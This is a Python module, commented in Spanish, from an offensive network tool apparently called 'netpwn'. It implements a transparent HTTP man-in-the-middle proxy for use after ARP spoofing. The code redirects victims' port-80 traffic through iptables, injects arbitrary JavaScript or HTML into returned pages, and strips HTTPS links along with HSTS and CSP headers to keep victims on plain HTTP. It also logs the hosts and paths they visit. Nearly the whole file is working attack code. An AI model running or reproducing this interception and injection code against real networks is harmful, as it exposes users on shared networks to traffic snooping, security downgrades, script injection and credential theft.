"""MITM a nivel HTTP: proxy transparente con inyeccion de contenido y sslstrip.

Funciona sobre un MITM ya activo (ARP). El flujo es:

  1. `iptables` redirige el trafico TCP/80 de la victima a nuestro puerto local.
  2. Este proxy lee el destino original (SO_ORIGINAL_DST), conecta al servidor
     real, reenvia la peticion y procesa la respuesta.
  3. En las respuestas HTML inyecta un payload (JS/HTML) justo antes de </body>.
  4. "sslstrip-lite": reescribe enlaces https:// -> http:// y elimina cabeceras
     HSTS/upgrade para que el navegador no salte a TLS.

Solo intercepta HTTP en claro. El trafico HTTPS no se descifra; sslstrip solo
evita que la victima sea *promovida* a HTTPS desde paginas HTTP.
"""
import asyncio
import re
import socket
import struct

from core import fw
from core.bus import bus

SO_ORIGINAL_DST = 80  # valor del sockopt en Linux (netfilter)

_HTTPS_RE = re.compile(rb"https://", re.I)
_HSTS_RE = re.compile(rb"(?im)^(strict-transport-security|upgrade-insecure-requests|content-security-policy).*?\r\n")


def _iptables_add(port: int) -> None:
    """Instala la regla REDIRECT de TCP/80 hacia el proxy, etiquetada con el
    comentario `netpwn` para que la limpieza la encuentre incluso tras un crash."""
    fw.add_redirect(to_port=port, dport=80, table="nat", chain="PREROUTING", family="ipv4")


def _iptables_del() -> None:
    """Elimina todas las reglas etiquetadas (idempotente y seguro)."""
    fw.cleanup("ipv4")


def _original_dst(sock: socket.socket):
    try:
        data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
        port = struct.unpack("!H", data[2:4])[0]
        ip = socket.inet_ntoa(data[4:8])
        return ip, port
    except Exception:
        return None, None


class HttpInjector:
    def __init__(self, inject: str = "", sslstrip: bool = True, port: int = 8080):
        self.inject = (inject or "").encode()
        self.sslstrip = sslstrip
        self.port = port
        self._server: asyncio.base_events.Server | None = None
        self._task: asyncio.Task | None = None
        self.hits = 0

    # ----------------------------------------------------------------- utilidades
    def _rewrite_response(self, headers: bytes, body: bytes, ctype: str) -> tuple[bytes, bytes]:
        if self.sslstrip:
            headers = _HSTS_RE.sub(b"", headers)
            if b"text/html" in ctype.encode() or "text" in ctype:
                body = _HTTPS_RE.sub(b"http://", body)
        if self.inject and "text/html" in ctype:
            lowered = body.lower()
            idx = lowered.rfind(b"</body>")
            if idx == -1:
                idx = lowered.rfind(b"</html>")
            if idx != -1:
                body = body[:idx] + self.inject + body[idx:]
                self.hits += 1
                bus.emit({"type": "inject", "msg": f"Payload inyectado (#{self.hits})"})
        return headers, body

    async def _read_http_message(self, reader: asyncio.StreamReader):
        """Lee cabeceras + cuerpo (segun Content-Length). Devuelve (head, body, raw_rest)."""
        # Lectura con buffer (no byte a byte) con tope de 64KB para cabeceras.
        head = b""
        while b"\r\n\r\n" not in head:
            chunk = await reader.read(4096)
            if not chunk:
                break
            head += chunk
            if len(head) > 65536:
                break  # cabeceras desmesuradas: cortamos para no acumular sin fin
        if b"\r\n\r\n" not in head:
            return head, b"", b""
        header_part, _, rest = head.partition(b"\r\n\r\n")
        m = re.search(rb"(?i)content-length:\s*(\d+)", header_part)
        body = rest
        if m:
            length = min(int(m.group(1)), 65536)  # tope de 64KB de cuerpo acumulado
            while len(body) < length:
                chunk = await reader.read(length - len(body))
                if not chunk:
                    break
                body += chunk
        return header_part + b"\r\n\r\n", body, b""

    # ----------------------------------------------------------------- conexiones
    async def _handle(self, c_reader: asyncio.StreamReader, c_writer: asyncio.StreamWriter):
        sock = c_writer.get_extra_info("socket")
        dst_ip, dst_port = _original_dst(sock)
        if not dst_ip:
            c_writer.close()
            return
        try:
            s_reader, s_writer = await asyncio.open_connection(dst_ip, dst_port or 80)
        except Exception:
            c_writer.close()
            return

        try:
            req_head, req_body, _ = await self._read_http_message(c_reader)
            if not req_head:
                return
            # Pedimos sin compresion para poder inyectar en claro.
            req_head = re.sub(rb"(?i)accept-encoding:.*?\r\n", b"", req_head)
            host = b""
            hm = re.search(rb"(?i)host:\s*([^\r\n]+)", req_head)
            if hm:
                host = hm.group(1).strip()
            s_writer.write(req_head + req_body)
            await s_writer.drain()

            res_head, res_body, _ = await self._read_http_message(s_reader)
            ctype = ""
            cm = re.search(rb"(?i)content-type:\s*([^\r\n;]+)", res_head)
            if cm:
                ctype = cm.group(1).decode(errors="ignore").strip().lower()

            res_head, res_body = self._rewrite_response(res_head, res_body, ctype)
            # Recalcular Content-Length tras modificar el cuerpo.
            res_head = re.sub(rb"(?i)content-length:\s*\d+",
                              f"Content-Length: {len(res_body)}".encode(), res_head)
            c_writer.write(res_head + res_body)
            await c_writer.drain()

            path = b""
            pm = re.match(rb"\w+\s+(\S+)", req_head)
            if pm:
                path = pm.group(1)
            bus.emit({"type": "httpreq", "host": host.decode(errors="ignore"),
                      "path": path.decode(errors="ignore")[:80], "dst": dst_ip})
        except Exception:
            pass
        finally:
            for w in (c_writer, s_writer):
                try:
                    w.close()
                except Exception:
                    pass

    async def _serve(self):
        self._server = await asyncio.start_server(self._handle, "0.0.0.0", self.port)
        _iptables_add(self.port)
        bus.emit({"type": "inject", "msg": f"Proxy HTTP MITM activo en :{self.port} "
                  f"(sslstrip={'si' if self.sslstrip else 'no'})"})
        try:
            async with self._server:
                await self._server.serve_forever()
        finally:
            # Si el servidor muere inesperadamente, quitamos el redirect para no
            # dejar a las victimas mandando trafico a un puerto muerto.
            try:
                _iptables_del()
            except Exception:
                pass

    # ----------------------------------------------------------------- ciclo de vida
    def start(self, loop: asyncio.AbstractEventLoop):
        self._task = loop.create_task(self._serve())

    def stop(self):
        _iptables_del()
        if self._server:
            self._server.close()
        bus.emit({"type": "inject", "msg": "Proxy HTTP MITM detenido"})
